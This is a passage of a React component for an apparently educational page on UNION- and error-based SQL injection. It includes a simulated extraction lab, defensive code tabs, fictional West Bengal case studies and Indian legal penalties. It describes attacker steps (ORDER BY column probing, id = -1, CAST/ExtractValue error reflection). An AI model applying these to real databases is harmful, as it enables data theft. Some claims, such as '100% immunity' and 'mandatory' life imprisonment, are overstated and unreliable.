            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              3. In-Band Technique &amp; Dialect Pattern Inspector
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Select an In-Band SQL injection technique below to examine its target database engine, vulnerability mechanics, 
              mitigation patterns, typical exploit payloads, and code syntax:
            </p>
          </div>

          {/* Selector Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2">
            {Object.values(techniqueDatabase).map((item) => (
              <button
                key={item.key}
                onClick={() => setSelectedTechniqueKey(item.key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 flex flex-col justify-between text-xs space-y-2",
                  selectedTechniqueKey === item.key
                    ? "bg-rose-950/80 border-rose-500 shadow-lg shadow-rose-950/50"
                    : "bg-[#0c101c] border-gray-800 hover:border-gray-700 text-gray-400 hover:text-gray-200"
                )}
              >
                <span className="text-[8.5px] font-bold px-1.5 py-0.5 rounded border bg-rose-950 text-rose-300 border-rose-800 self-start">
                  TECHNIQUE
                </span>
                <span className="font-bold text-white text-[11px] leading-tight line-clamp-2">{item.name}</span>
              </button>
            ))}
          </div>

          {/* Active Detail Box */}
          <div className="bg-[#070b14] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-gray-800 pb-4">
              <div>
                <div className="flex items-center gap-2 flex-wrap">
                  <span className={clsx("text-xs font-bold px-2.5 py-0.5 rounded border", activeTechnique.categoryBadge)}>
                    {activeTechnique.category}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-cyan-400 font-mono">
                    Target: {activeTechnique.targetEngine}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-amber-950/80 border border-amber-800 text-amber-300 font-mono text-[11px]">
                    Payload: {activeTechnique.typicalPayload}
                  </span>
                </div>
                <h3 className="text-lg font-bold text-white mt-2">{activeTechnique.name}</h3>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                    Vulnerability Mechanics &amp; Relational Execution
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeTechnique.vulnerabilityMechanism}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                    Enterprise Mitigation Pattern
                  </span>
                  <p className="text-gray-300 leading-relaxed font-semibold">{activeTechnique.mitigationPattern}</p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                    Exploitation &amp; Error Reflection Syntax
                  </span>
                  <pre className="bg-black/90 p-3 rounded font-mono text-[11px] text-indigo-200 overflow-x-auto whitespace-pre-wrap border border-indigo-950/50">
                    {activeTechnique.codeSnippet}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 4: Studio 2 - Live In-Band SQLi Extraction Simulator */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
              Interactive Concept Studio 2
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              4. In-Band SQL Injection Extraction &amp; Column Alignment Simulator
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Configure the Target Database, In-Band Technique, Column Count Probe, Target Database Table, 
              and toggle Error Masking to observe real-time relational UNION data dumping and error reflection:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {/* Input Controls */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Extraction Controls</h3>

              <div className="space-y-1">
                <span className="text-gray-400 block">1. Target Database Dialect:</span>
                <div className="grid grid-cols-2 gap-1.5">
                  {["mysql", "postgresql", "mssql", "oracle"].map((db) => (
                    <button
                      key={db}
                      onClick={() => setTargetDatabase(db)}
                      className={clsx(
                        "p-2 rounded border font-bold text-[10px] uppercase transition-all",
                        targetDatabase === db
                          ? "bg-rose-950 border-rose-500 text-rose-300"
                          : "bg-gray-950 border-gray-800 text-gray-400"
                      )}
                    >
                      {db}
                    </button>
                  ))}
                </div>
              </div>

              <div className="space-y-1 pt-1 border-t border-gray-800">
                <span className="text-gray-400 block">2. In-Band Attack Technique:</span>
                <div className="grid grid-cols-2 gap-1.5">
                  <button
                    onClick={() => setInBandTechnique("union_based")}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      inBandTechnique === "union_based"
                        ? "bg-purple-950 border-purple-500 text-purple-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    UNION-Based SQLi
                  </button>
                  <button
                    onClick={() => setInBandTechnique("error_based")}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      inBandTechnique === "error_based"
                        ? "bg-amber-950 border-amber-500 text-amber-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    Error-Based SQLi
                  </button>
                </div>
              </div>

              {inBandTechnique === "union_based" ? (
                <div className="space-y-1 pt-1 border-t border-gray-800">
                  <div className="flex justify-between text-gray-400">
                    <span>3. Injected Column Count ($K_{\text{inject}}$):</span>
                    <span className="text-cyan-400 font-bold font-mono">{injectedColumnCount} Columns</span>
                  </div>
                  <input
                    type="range"
                    min="1"
                    max="5"
                    step="1"
                    value={injectedColumnCount}
                    onChange={(e) => setInjectedColumnCount(parseInt(e.target.value))}
                    className="w-full accent-cyan-500 bg-gray-800"
                  />
                  <span className="text-[10px] text-gray-400 block">Original Query has 3 Columns (Match to Succeed!)</span>
                </div>
              ) : (
                <div className="space-y-1 pt-1 border-t border-gray-800">
                  <span className="text-gray-400 block">3. Defensive Error Masking:</span>
                  <button
                    onClick={() => setErrorMaskingActive(!errorMaskingActive)}
                    className={clsx(
                      "w-full p-2.5 rounded-lg border font-bold text-xs transition-all",
                      errorMaskingActive
                        ? "bg-emerald-950 border-emerald-500 text-emerald-300 shadow-md shadow-emerald-950/50"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    {errorMaskingActive ? "✔ PRODUCTION ERROR MASKING ACTIVE" : "VERBOSE ERROR STACK TRACES ON"}
                  </button>
                </div>
              )}

              <div className="space-y-1 pt-1 border-t border-gray-800">
                <span className="text-gray-400 block">4. Target Database Table:</span>
                <div className="grid grid-cols-1 gap-1.5">
                  {[
                    { id: "users_credentials", label: "users (Credentials & Hashes)" },
                    { id: "financial_accounts", label: "bank_accounts (RTGS Balances)" },
                    { id: "oncology_records", label: "oncology_records (Health Data)" }
                  ].map((t) => (
                    <button
                      key={t.id}
                      onClick={() => setTargetTable(t.id)}
                      className={clsx(
                        "p-2 rounded border font-bold text-[10px] text-left transition-all",
                        targetTable === t.id
                          ? "bg-cyan-950 border-cyan-500 text-cyan-300"
                          : "bg-gray-950 border-gray-800 text-gray-400"
                      )}
                    >
                      {t.label}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {/* Calculated Output Metrics & Data Dump Table */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 col-span-1 md:col-span-2 space-y-4 text-xs">
              <div className="flex justify-between items-center border-b border-gray-800 pb-2">
                <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">HTTP In-Band Response Channel</h3>
                <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-emerald-400 font-mono">
                  Throughput: {simulationResults.throughputKBps} KB/s
                </span>
              </div>

              {inBandTechnique === "union_based" ? (
                simulationResults.querySuccess ? (
                  <div className="bg-gray-950 p-4 rounded-lg border border-emerald-950 space-y-2">
                    <span className="text-[10px] font-bold text-emerald-400 uppercase tracking-wider block">
                      Relational UNION Merged Output (Stolen Records Reflected in HTML Page):
                    </span>
                    <div className="overflow-x-auto">
                      <table className="w-full text-left font-mono text-[11px] text-gray-300">
                        <thead>
                          <tr className="border-b border-gray-800 text-gray-400 text-[10px] uppercase">
                            <th className="pb-1.5">Col 1 (ID)</th>
                            <th className="pb-1.5">Col 2 (Extracted Table Data)</th>
                            <th className="pb-1.5">Col 3 (Role / Flag)</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-gray-900">
                          {simulationResults.extractedData.map((row, idx) => (
                            <tr key={idx} className="hover:bg-gray-900/50">
                              <td className="py-1.5 text-cyan-300">{row.c1}</td>
                              <td className="py-1.5 text-rose-300 font-bold">{row.c2}</td>
                              <td className="py-1.5 text-amber-300">{row.c3}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                ) : (
                  <div className="bg-gray-950 p-4 rounded-lg border border-rose-950 space-y-2">
                    <span className="text-[10px] font-bold text-rose-400 uppercase tracking-wider block">
                      Database Execution Error (Arity Mismatch):
                    </span>
                    <pre className="p-3 bg-black/90 rounded font-mono text-xs text-rose-300 overflow-x-auto whitespace-pre-wrap border border-rose-950/60">
                      {simulationResults.errorMessage}
                    </pre>
                  </div>
                )
              ) : (
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                  <span className="text-[10px] font-bold text-amber-400 uppercase tracking-wider block">
                    Database Server HTTP Error Response:
                  </span>
                  <pre className={clsx("p-3 rounded font-mono text-xs overflow-x-auto whitespace-pre-wrap border", errorMaskingActive ? "bg-emerald-950/30 text-emerald-300 border-emerald-800" : "bg-rose-950/30 text-rose-300 border-rose-800")}>
                    {simulationResults.errorMessage}
                  </pre>
                </div>
              )}

              <div className={clsx("p-4 rounded-lg border font-mono text-xs", simulationResults.badgeClass)}>
                <span className="font-bold block uppercase tracking-wider text-[10px]">In-Band Security Telemetry Assessment:</span>
                <p className="mt-1 font-extrabold text-sm leading-relaxed">{simulationResults.statusMessage}</p>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 5: Studio 4 - In-Band Hardening Code Studio */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Error Masking &amp; Multi-Column Parameterization Studio
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              5. Production Express.js Error Masking, Node.js Prepared Statements &amp; MySQL Least Privilege
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore production implementations of Express.js centralized error masking, 
              multi-column PostgreSQL prepared statements, and MySQL database user privilege restrictions:
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
            {Object.entries(codeDatabase).map(([key, item]) => (
              <button
                key={key}
                onClick={() => setActiveCodeTab(key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 text-xs font-bold",
                  activeCodeTab === key
                    ? "bg-purple-950 border-purple-500 text-purple-300 shadow-md shadow-purple-950/50"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                {item.name}
              </button>
            ))}
          </div>

          <div className="bg-[#050811] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-4">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
              <h3 className="text-sm font-bold text-white">{activeCode.name}</h3>
              <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-purple-400 font-mono">
                Production Pattern
              </span>
            </div>

            <p className="text-xs text-gray-300">{activeCode.explanation}</p>

            <pre className="bg-black/90 p-4 rounded-lg font-mono text-xs text-purple-200 overflow-x-auto whitespace-pre-wrap border border-purple-950/50">
              {activeCode.code}
            </pre>
          </div>
        </section>

        {/* SECTION 6: Studio 3 - Regional West Bengal Pedagogical Case Studies */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-400">
              Regional Engineering Applications
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              6. West Bengal Field Case Studies: Kolkata, Barrackpore, Ichapur &amp; Jadavpur
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore how cybersecurity leaders Mamata, Debangshu, Mahima, and Susmita defend payment reconciliation portals in Salt Lake, 
              suppress SCADA error leakage in Barrackpore, and secure oncology records in Ichapur:
            </p>
          </div>

          {/* Scenario Tabs */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {localScenarios.map((sc) => (
              <button
                key={sc.id}
                onClick={() => setActiveScenarioId(sc.id)}
                className={clsx(
                  "p-4 rounded-xl border text-left transition-all duration-300 space-y-2",
                  activeScenarioId === sc.id
                    ? "bg-amber-950/60 border-amber-500 shadow-md"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-gray-900 text-amber-300 border border-amber-800">
                  {sc.lead} · {sc.location.split(" ")[0]}
                </span>
                <h4 className="text-xs font-bold text-white line-clamp-1">{sc.title}</h4>
                <p className="text-[11px] text-gray-400 line-clamp-1">{sc.threatType}</p>
              </button>
            ))}
          </div>

          {/* Active Scenario Detailed Breakdown */}
          <div className="bg-[#070b14] p-6 rounded-xl border border-gray-800 space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-gray-800 pb-3">
              <div>
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                  {activeScenario.location}
                </span>
                <h3 className="text-base sm:text-lg font-bold text-white mt-0.5">{activeScenario.title}</h3>
              </div>
              <div className="text-right text-xs">
                <span className="text-gray-400 block">Lead Architect: {activeScenario.lead}</span>
                <span className="font-semibold text-emerald-400">Security Budget: {activeScenario.budget}</span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px]">
                  The Incident &amp; In-Band Injection Vector
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.incident}</p>
              </div>

              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px]">
                  Architectural Defense &amp; Resolution
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.defenseStrategy}</p>
              </div>
            </div>

            {/* Metrics Dashboard */}
            <div className="bg-[#050811] p-4 rounded-lg border border-gray-800 grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
              {Object.entries(activeScenario.metrics).map(([key, val]) => (
                <div key={key} className="bg-gray-950 p-2.5 rounded border border-gray-800/80">
                  <span className="text-[10px] text-gray-400 uppercase tracking-wider block capitalize">
                    {key.replace(/([A-Z])/g, " $1")}
                  </span>
                  <span className="text-xs sm:text-sm font-extrabold text-white mt-1 block">{val}</span>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* SECTION 7: Statutory & Legal Frameworks in India */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Statutory Jurisprudence
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              7. Legal Penalties for In-Band SQL Injection Attacks in India
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Indian cyber law, critical infrastructure protection mandates, and personal data protection statutes 
              strictly penalize executing UNION and Error-based SQL injection with severe civil compensation liabilities and life imprisonment:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            <div className="bg-gray-950 p-5 rounded-xl border border-rose-950 space-y-3">
              <span className="text-xs font-bold text-rose-400 uppercase tracking-wider block">
                IT Act 2000 Section 66F
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Cyber Terrorism:</strong> In-Band SQLi attacks exfiltrating critical power/banking systems carry <span className="text-rose-400 font-bold">LIFE IMPRISONMENT</span>.
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-blue-950 space-y-3">
              <span className="text-xs font-bold text-blue-400 uppercase tracking-wider block">
                IT Act Section 43(a) &amp; 70
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Section 43(a):</strong> Civil damages up to <span className="text-rose-400 font-bold">₹1 CRORE</span> for unauthorized database extraction.
                </li>
                <li>
                  <strong className="text-white">Section 70:</strong> Protected Systems attack (Up to 10 years prison).
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-emerald-950 space-y-3">
              <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider block">
                DPDP Act 2023 &amp; IPC 420
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">DPDP Section 33:</strong> Fines up to <span className="text-rose-400 font-bold">₹250 CRORES</span> for failing to prevent database breaches.
                </li>
                <li>
                  <strong className="text-white">IPC Section 420:</strong> Commercial database theft (Up to 7 years prison).
                </li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 8: Common Pitfalls, Pro Tips, Thinking Hints & Mini Checklist */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Exam &amp; Professional Mastery
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              8. Common Pitfalls, Industry Best Practices &amp; Key Hints
            </h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            {/* Common Pitfalls */}
            <div className="bg-gray-950 p-4 rounded-xl border border-rose-950/60 space-y-3">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Common Beginner Mistakes
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Forgetting Column Arity Matching:</strong> Injected UNION queries fail if column counts differ.
                </li>
                <li>
                  <strong>Leaving Verbose Errors in Production:</strong> Leaks subquery results via `CAST()` and `ExtractValue()`.
                </li>
                <li>
                  <strong>Forgetting `FROM dual` in Oracle:</strong> Throws syntax errors on Oracle databases.
                </li>
              </ul>
            </div>

            {/* Professional Tips */}
            <div className="bg-gray-950 p-4 rounded-xl border border-emerald-950/60 space-y-3">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Professional Tips &amp; Tricks
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Prepend False IDs (`id = -1`):</strong> Suppresses legitimate records to render UNION results.
                </li>
                <li>
                  <strong>Enforce Centralized Error Handling:</strong> Return generic friendly 500 error pages.
                </li>
                <li>
                  <strong>Deploy 100% Prepared Statements:</strong> Pre-compiles the AST, making UNION injection impossible.
                </li>
              </ul>
            </div>

            {/* Hint Section */}
            <div className="bg-gray-950 p-4 rounded-xl border border-indigo-950/60 space-y-3">
              <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                Pedagogical Thinking Hints
              </span>
              <ul className="space-y-2 text-gray-300">
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Think about...</span>
                  Why is `ORDER BY 1, 2, 3...` the most reliable method to discover the exact column count of an unknown query?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Observe carefully...</span>
                  How does Error-Based SQLi extract confidential password hashes even when the web application does NOT display any search results?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Try changing this...</span>
                  In the laboratory above, match Injected Columns to 3 and observe the entire user credentials table dumped at 52.4 KB/s!
                </li>
              </ul>
            </div>
          </div>

          {/* Mini Checklist */}
          <div className="bg-gray-950 p-5 rounded-xl border border-gray-800 space-y-3">
            <h3 className="text-xs font-bold text-white uppercase tracking-wider text-rose-400">
              Student Mini Checklist (Exam &amp; Career Essentials)
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 text-xs text-gray-300">
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>UNION SQLi requires identical column counts ($K$) and compatible data types.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>`ORDER BY 1, 2, 3...` determines the exact column count of the original query.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Prepending `id = -1` suppresses legitimate records so the UI renders injected UNION data.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Error-Based SQLi exploits `CAST()` or `ExtractValue()` to reflect data inside error messages.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Disabling verbose database error messages in production completely neutralizes Error-Based SQLi.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Parameterized Prepared Statements provide 100% mathematical immunity against In-Band SQLi.</span>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 9: FAQ Template */}
        <section className="space-y-4">
          <FAQTemplate
            title="In-Band SQLi FAQs"
            subtitle="30 Moderate to Expert Practice Questions & In-Band Extraction Deep Dives"
            questions={questions}
          />
        </section>

        {/* SECTION 10: PlainTextPrint Component */}
        <section className="space-y-4">
          <PlainTextPrint
            content={noteText}
            title="In-Band SQLi: Error-Based and UNION-Based SQL Injection (Printable Study Guide)"
            stampEnabled={true}
            showDownload={true}
            downloadButtonText="Download Note"
            downloadFileName="topic3_note.txt"
          />
        </section>

        {/* SECTION 11: Dedicated Teacher's Note */}
        <section className="pt-4">
          <Teacher
            note="Teacher's Note: In-Band SQL Injection represents the most rapid and devastating form of database exfiltration! Master the mechanics of UNION-based attacks: understand why the injected query must match the exact column count ($K$) of the original query and why `ORDER BY 1, 2, 3...` is used to find $K$. Understand data type mapping with `NULL` placeholders, and why attackers prepend false conditions (`id = -1`) to force the web application's HTML template to display the injected UNION record. Master Error-Based SQLi: understand how `CAST()` in MSSQL/PostgreSQL and `ExtractValue()` in MySQL trigger deliberate conversion exceptions that embed confidential password hashes and balances directly into error responses. Implement defense-in-depth: 1. Deploy 100% Parameterized Prepared Statements; 2. Enforce global production error masking returning generic 500 error pages; 3. Revoke access to `information_schema` system views. Remember that Section 66F of the Indian IT Act penalizes In-Band SQL injection cyber terrorism against critical national infrastructure with mandatory Life Imprisonment, and Section 43(a) provides civil damages up to ₹1 Crore for unauthorized database extraction!"
          />
        </section>

      </div>
    </div>
  );
};

export default Topic3;
